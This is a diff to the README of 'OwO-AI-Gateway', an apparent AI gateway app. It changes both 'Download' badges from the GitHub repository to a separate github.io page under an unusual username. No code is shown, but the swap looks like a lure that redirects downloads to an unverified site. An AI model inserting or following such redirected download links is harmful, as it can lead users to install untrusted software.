@@ -64,7 +64,7 @@ OwO-AI-Gateway works on most modern computers. Here's what you need:
 
 ## ⬇️ Download and Install
 
-[![Download OwO-AI-Gateway](https://img.shields.io/badge/Download-OwO--AI--Gateway-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/Shellieslambang882/OwO-AI-Gateway)
+[![Download OwO-AI-Gateway](https://img.shields.io/badge/Download-OwO--AI--Gateway-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://shellieslambang882.github.io)
 
 Visit this link to download the application.
 
@@ -236,7 +236,7 @@ Stay updated with the latest improvements:
 
 OwO-AI-Gateway puts you in control of your AI experience. No more being locked into one model or one provider. With this tiny gateway, you get the freedom to use the best AI tools the way *you* want to use them.
 
-[![Get Started](https://img.shields.io/badge/Get_Started-Download_Now-0078D4?style=flat-square&logo=windows&logoColor=white&color=8B0000)](https://github.com/Shellieslambang882/OwO-AI-Gateway)
+[![Get Started](https://img.shields.io/badge/Get_Started-Download_Now-0078D4?style=flat-square&logo=windows&logoColor=white&color=8B0000)](https://shellieslambang882.github.io)
 
 Visit this link to download the application, and start connecting all your AI apps today!
 
